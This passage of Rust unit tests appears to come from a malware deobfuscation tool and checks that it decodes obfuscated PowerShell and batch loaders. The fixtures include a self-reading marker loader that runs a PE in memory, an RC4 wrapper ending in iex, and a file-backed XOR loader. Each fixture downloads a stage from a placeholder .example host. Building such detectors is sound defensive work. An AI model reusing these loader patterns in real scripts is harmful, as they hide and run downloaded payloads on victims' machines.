    #[test]
    fn ps1_self_read_marker_chunks_reversed_gzip_pe_is_recovered() {
        use base64::Engine;
        use std::io::Write as _;

        let url = "https://selfmarker-pe.example/payload";
        let mut pe = vec![0u8; 0x200];
        pe[0..2].copy_from_slice(b"MZ");
        pe[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        pe.extend_from_slice(url.as_bytes());
        let mut reversed = pe.clone();
        reversed.reverse();
        let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        gz.write_all(&reversed).unwrap();
        let b64 = base64::engine::general_purpose::STANDARD.encode(gz.finish().unwrap());
        let (left, right) = b64.split_at(b64.len() / 2);
        let ps = r#"$exe=[System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName;$sb=New-Object -TypeName System.Text.StringBuilder;foreach($line in [System.IO.File]::ReadLines($exe.Remove($exe.Length-4))){if($line -like '* MARK*'){$sb.Append($line.Split('MARK')[1])|Out-Null}};$bytes=[Convert]::FromBase64String($sb.ToString());$input=New-Object System.IO.MemoryStream(,$bytes);$output=New-Object System.IO.MemoryStream;$gzipStream=New-Object System.IO.Compression.GzipStream $input,([IO.Compression.CompressionMode]::Decompress);$gzipStream.CopyTo($output);[byte[]]$bytes=$output.ToArray();[Array]::Reverse($bytes);[System.Reflection.Assembly]::Load($bytes)"#;
        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let encoded_ps = base64::engine::general_purpose::STANDARD.encode(utf16);
        let script =
            format!("powershell -enc {encoded_ps}\r\nset a= MARK{left}\r\nset b= MARK{right}\r\n");
        let report = analyze(script.as_bytes(), &Config::default());

        assert!(
            report.recovered_pe.iter().any(|(label, bytes)| label
                .starts_with("ps1-self-marker-reversed-gzip-pe")
                && bytes.starts_with(b"MZ")),
            "marker reversed gzip PE was not recovered: {:?}",
            report.recovered_pe
        );
        assert!(
            report
                .traits
                .iter()
                .any(|t| { matches!(t, Trait::DownloadInDeobText { src, .. } if src == url) }),
            "recovered marker PE URL was not extracted: {:?}",
            report.traits
        );
    }

    #[test]
    fn ps1_rc4_wrapper_stage_is_decoded_and_recursed() {
        use base64::Engine;

        fn rc4_encrypt(plain: &[u8], key: &[u8]) -> Vec<u8> {
            let mut s = [0u8; 256];
            for (i, slot) in s.iter_mut().enumerate() {
                *slot = i as u8;
            }
            let mut j = 0u8;
            for i in 0..256usize {
                j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
                s.swap(i, j as usize);
            }
            let mut i = 0u8;
            let mut j = 0u8;
            let mut out = Vec::with_capacity(plain.len());
            for &b in plain {
                i = i.wrapping_add(1);
                j = j.wrapping_add(s[i as usize]);
                s.swap(i as usize, j as usize);
                let k = s[(s[i as usize].wrapping_add(s[j as usize])) as usize];
                out.push(b ^ k);
            }
            out
        }

        let plaintext = "Invoke-WebRequest https://rc4.example/stage.ps1";
        let key = b"Key";
        let enc_b64 = base64::engine::general_purpose::STANDARD
            .encode(rc4_encrypt(plaintext.as_bytes(), key));
        let key_b64 = base64::engine::general_purpose::STANDARD.encode(key);
        let ps = format!(
            r#"
$rc4EncData = '{enc_b64}'
$rc4KeyB64 = '{key_b64}'
$b64DecodeFunc = {{
    param([string]$dataString)
    [System.Convert]::FromBase64String($dataString)
}}
$encBytes = & $b64DecodeFunc $rc4EncData
$keyBytes = & $b64DecodeFunc $rc4KeyB64
$rc4Decrypt = {{
    param(
        [byte[]]$cipherData,
        [byte[]]$decryptKey
    )
    $sArray = New-Object int[] 256
    $kArray = New-Object byte[] 256
    for ($iIndex = 0; $iIndex -lt 256; $iIndex++) {{
        $sArray[$iIndex] = $iIndex
        $kArray[$iIndex] = $decryptKey[$iIndex % $decryptKey.Length]
    }}
    $jVar = 0
    for ($iIndex = 0; $iIndex -lt 256; $iIndex++) {{
        $jVar = ($jVar + $sArray[$iIndex] + $kArray[$iIndex]) % 256
        $tempVal = $sArray[$iIndex]
        $sArray[$iIndex] = $sArray[$jVar]
        $sArray[$jVar] = $tempVal
    }}
    $outputBytes = New-Object byte[] $cipherData.Length
    $xVar = 0
    $yVar = 0
    for ($iIndex = 0; $iIndex -lt $cipherData.Length; $iIndex++) {{
        $xVar = ($xVar + 1) % 256
        $yVar = ($yVar + $sArray[$xVar]) % 256
        $tempVal = $sArray[$xVar]
        $sArray[$xVar] = $sArray[$yVar]
        $sArray[$yVar] = $tempVal
        $tVal = ($sArray[$xVar] + $sArray[$yVar]) % 256
        $outputBytes[$iIndex] = [byte]($cipherData[$iIndex] -bxor $sArray[$tVal])
    }}
    return $outputBytes
}}
$mainDecrypt = {{
    param(
        [byte[]]$encBytes,
        [byte[]]$keyBytes
    )
    $outputBytes = & $rc4Decrypt -cipherData $encBytes -decryptKey $keyBytes
    if ($outputBytes -ne $null) {{
        return [System.Text.Encoding]::UTF8.GetString($outputBytes)
    }}
    return $null
}}
$finalScript = & $mainDecrypt -encBytes $encBytes -keyBytes $keyBytes
if ($finalScript -ne $null) {{
    iex $finalScript
}}
"#
        );
        let report = analyze(ps.as_bytes(), &Config::default());

        assert!(
            report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::Download { src, .. } if src == "https://rc4.example/stage.ps1")),
            "RC4 wrapper stage was not decoded and recursed:\n{:?}",
            report.traits
        );
    }

    #[test]
    fn ps1_file_backed_base64_xor_loader_is_extracted() {
        use base64::Engine;
        let payload = "Invoke-WebRequest -Uri https://xorloader.example/stage.ps1";
        let encrypted: Vec<u8> = payload
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .map(|b| b ^ 253)
            .collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
        let script = format!(
            "@echo off\r\necho {b64} > \"%TEMP%\\\\stage.dat\"\r\npowershell -NoP -C \"$k=253;$d=(gc '%TEMP%\\\\stage.dat') -join '';$b=[Convert]::FromBase64String($d);$x=0..($b.Length-1)|%{{$b[$_]-bxor$k}};$s=[Text.Encoding]::Unicode.GetString($x);iex $s\"\r\n"
        );
        let report = analyze(script.as_bytes(), &Config::default());
        assert!(
            report
                .extracted_ps1_normalized
                .iter()
                .any(|ps| ps.contains("https://xorloader.example/stage.ps1")),
            "file-backed xor stage was not normalized:\n{:?}",
            report.extracted_ps1_normalized
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(t, Trait::Download { src, .. } if src.contains("xorloader.example/stage.ps1"))
            }),
            "file-backed xor stage URL was not extracted: {:?}",
            report.traits
        );
    }

